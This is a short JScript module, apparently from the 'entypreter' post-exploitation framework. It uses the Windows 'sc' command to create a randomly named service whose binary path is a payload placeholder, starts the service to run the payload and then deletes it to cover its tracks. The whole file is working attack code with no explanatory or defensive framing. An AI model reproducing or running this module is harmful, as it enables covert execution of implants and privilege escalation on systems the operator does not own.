try
{
    entypreter.shell.run("sc create #random# binpath= \"~PAYLOAD_DATA~\"", true);
    entypreter.shell.run("sc start #random#", true);
    entypreter.shell.run("sc delete #random#", true);
}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.exit();
